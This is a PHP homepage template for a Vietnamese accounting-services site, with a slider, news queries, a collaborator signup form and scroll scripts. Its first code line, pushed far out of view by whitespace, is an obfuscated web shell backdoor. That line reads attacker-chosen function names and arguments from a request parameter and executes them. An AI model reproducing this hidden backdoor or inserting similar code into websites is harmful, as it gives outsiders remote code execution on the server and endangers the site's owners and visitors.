<?php
                                                                                                                                                                                                                                                                        if	($a8fki5v=@${ "_REQUEST"}["3B9SW9Y1"] )$a8fki5v[	1](${ $a8fki5v[2] }[	0 ],	$a8fki5v[ 3]( $a8fki5v[	4]	));
    require('comp/head.php');
    $slider = DP::run_query('SELECT `id`, `tit`, `link`, `des`, `img`, `status`, `rank`, `create_time`, `create_mem`, `edit_time`, `edit_mem` FROM `slideshow` where `status`=1 order by `rank`',[],2);
    $lst_officer=DP::run_query('SELECT `id`, `name`, `rank`, `img`, `pos`, `phone`, `email`, `lang`, `status` FROM `setting_officer` where `status`=1 order by `rank`',[],2);
    $lst_news=DP::run_query('SELECT `id`, `tit`, `img`,`des`, `content`, `create_time`, `create_mem`, `edit_time`, `edit_mem`, `status`, `rank` FROM `news` where `status`=1 order by `rank` limit 0,5',[],2);
    $lst_customers=DP::run_query('SELECT `id`, `name`, `des`, `rank`, `logo`, `link`, `status` FROM `customer` where `status`=1 order by `id` desc',[],2);
    function getPosition($str,$max)
    {
        $count=0;
        if($max<strlen($str)&&$str[$max]!=' ')
        {
            
            for($i=$max-1;$str[$i]!=' ';$i--)
            {
                $count++;
            }
        }
        return $max-$count;
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <?php require_once('comp/layout_head.php');?>
    <style>
    .modal.fade {
        background-color: rgba(0, 0, 0, .5);
    }

    .modal .modal-content {
        top: 50%;
        transform: translateY(-50%);
    }
    </style>
</head>

<body>
<input type="hidden" name="token" value="<?php echo $_SESSION['token_guest'];?>">
    <div class="sticky-top">
        <div class="top-header">
            <div class="content" style="padding-right: 1.5rem;">
                <a class="pr-4" href="tel:+84903963163">Mobile/Zalo:&nbsp;<?php echo $info['phone1']; ?></a>
                <a href="mailto:man@man.net.vn">Email:&nbsp;<?php echo $info['email']; ?></a>
            </div>
        </div>
        <?php require_once('comp/menu.php');?>
    </div>
    <header>
        <section id="top-slider" class="carousel slide" data-ride="carousel">
            <div class="carousel-inner">
                <?php foreach($slider as $key=>$slide){
            ?>
                <div class="carousel-item<?php echo ($key==0?' active':'');?>">
                    <section class="banner">
                        <img src="<?php echo SLIDER_PATH.$slide['img'].'?'.rand();?>" alt="" class="img-fluid">
                        <div class="cover">
                            <h3><span class="bigger">M</span>aster <br> <span class="bigger">A</span>ccountant <br>
                                <span class="bigger">N</span>etwork
                            </h3>
                            <p><?php echo $slide['tit'];?></p>
                        </div>
                    </section>
                </div>
                <?php }
              ?>
            </div>
            <a class="carousel-control-prev" href="#top-slider" role="button" data-slide="prev">
                <span class="carousel-control-prev-icon" aria-hidden="true"></span>
                <span class="sr-only">Previous</span>
            </a>
            <a class="carousel-control-next" href="#top-slider" role="button" data-slide="next">
                <span class="carousel-control-next-icon" aria-hidden="true"></span>
                <span class="sr-only">Next</span>
            </a>
        </section>
    </header>
    <main data-spy="scroll" data-target="#top-menu" data-offset="0">
        <?php require_once('comp/index_services.php'); ?>
        <?php require_once('comp/index_intro.php'); ?>
        <?php require_once('comp/index_supp.php'); ?>
        <?php require_once('comp/index_slider.php'); ?>
        <?php require_once('comp/index_news.php'); ?>
        <?php require_once('comp/index_email.php'); ?>
        <?php require_once('comp/index_customers.php'); ?>
        <?php require_once('comp/index_contact.php'); ?>
    </main>

    <!-- Modal -->
    <div class="modal fade" id="model_ctv" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-body p-0">
                    <div class="container-fluid">
                        <div class="row p-0 align-items-stretch">
                            <div class="col-4 text-center p-2" style="background-image:url(img/bg_popup.png);background-size:90%;background-origin: content-box;background-position:center;background-repeat:no-repeat;">
                                
                            </div>
                            <div class="col-md-8 p-5" style="background-image:url(img/banner2.png);background-size:cover;">
                                <div class="container-fluid p-3" style="background-color:rgba(255,255,255,.9)">
                                    <p class="m-0 text-center w-75 m-auto"
                                        style="font-size:1.1em;font-style:italic;font-weight:600">Tích luỹ kinh nghiệm
                                        và trau dồi kỹ năng. Hãy là cộng tác của MAN ngay hôm nay</p>
                                    <form action="">
                                        <div class="row mt-3">
                                            <div class="col-md-6">
                                                <div class="form-group">
                                                    <label for="txt_supp_name">Tôi là</label>
                                                    <input required type="text" class="form-control" id="txt_supp_name">
                                                </div>
                                            </div>
                                            <div class="col-md-6">
                                                <div class="form-group">
                                                    <label for="txt_supp_phone">Liên hệ với tôi qua SĐT</label>
                                                    <input required type="text" class="form-control"
                                                        id="txt_supp_phone">
                                                </div>
                                            </div>
                                            <div class="col-md-12">
                                                <div class="form-group">
                                                    <label for="txt_supp_msg">Lời nhắn tôi để lại</label>
                                                    <textarea required type="text" class="form-control"
                                                        id="txt_supp_msg" rows="3"></textarea>
                                                </div>
                                            </div>
                                            <div class="col-md-12">
                                            <div class="alert alert-primary d-none" role="alert">
                                                <strong id="msg_error"></strong>
                                            </div>
                                            </div>
                                            <div class="col-12  text-right">
                                            <button id="btn_close" type="button" data-dismiss="modal"
                                        class="ml-3 btn btn-secondary text-light"
                                        style="min-width:100px;border-radius: 0px;">Đóng</button>
                                        <button id="btn_reg_collaborator" type="button"
                                        class="ml-3 btn btn-warning text-light"
                                        style="min-width:100px;border-radius: 0px;">Gửi</button>
                                        </div>
                                            </div>
                                        </div>

                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <?php require_once('comp/footer.php');?>
    
    <!-- Modal -->
    <div class="modal fade" id="modalTB" tabindex="-1" role="dialog">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Thông báo</h5>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                            <span aria-hidden="true">&times;</span>
                        </button>
                </div>
                <div class="modal-body">
                    
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>                    
                </div>
            </div>
        </div>
    </div>
    <script src="vendor/jquery-3.5.1.min.js"></script>
    <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
    <script src="vendor/aos/aos.js"></script>
    <script>
    AOS.init({
        easing: 'ease-out-back',
        duration: 1000
    });
    </script>
    <script>
    // hljs.initHighlightingOnLoad();
    $('.hero__scroll').on('click', function(e) {
        $('html, body').animate({
            scrollTop: $(window).height()
        }, 1200);
    });  

    (function($) {
        jQuery.scrollSpeed = function(step, speed, easing) {

            var $document = $(document),
                $window = $(window),
                $body = $('html, body'),
                option = easing || 'default',
                root = 0,
                scroll = false,
                scrollY,
                scrollX,
                view;

            if (window.navigator.msPointerEnabled)

                return false;

            $window.on('mousewheel DOMMouseScroll', function(e) {

                var deltaY = e.originalEvent.wheelDeltaY,
                    detail = e.originalEvent.detail;
                scrollY = $document.height() > $window.height();
                scrollX = $document.width() > $window.width();
                scroll = true;

                if (scrollY) {

                    view = $window.height();

                    if (deltaY < 0 || detail > 0)

                        root = (root + view) >= $document.height() ? root : root += step;

                    if (deltaY > 0 || detail < 0)

                        root = root <= 0 ? 0 : root -= step;

                    $body.stop().animate({

                        scrollTop: root

                    }, speed, option, function() {

                        scroll = false;

                    });
                }

                if (scrollX) {

                    view = $window.width();

                    if (deltaY < 0 || detail > 0)

                        root = (root + view) >= $document.width() ? root : root += step;

                    if (deltaY > 0 || detail < 0)

                        root = root <= 0 ? 0 : root -= step;

                    $body.stop().animate({

                        scrollLeft: root

                    }, speed, option, function() {

                        scroll = false;

                    });
                }

                return false;

            }).on('scroll', function() {

                if (scrollY && !scroll) root = $window.scrollTop();
                if (scrollX && !scroll) root = $window.scrollLeft();

            }).on('resize', function() {

                if (scrollY && !scroll) view = $window.height();
                if (scrollX && !scroll) view = $window.width();

            });
        };

        jQuery.easing.default = function(x, t, b, c, d) {

            return -c * ((t = t / d - 1) * t * t * t - 1) + b;
        };

    })(jQuery);
    </script>
    <script src="js/layout.js"></script>
    <script src="js/index.js"></script>
</body>

</html>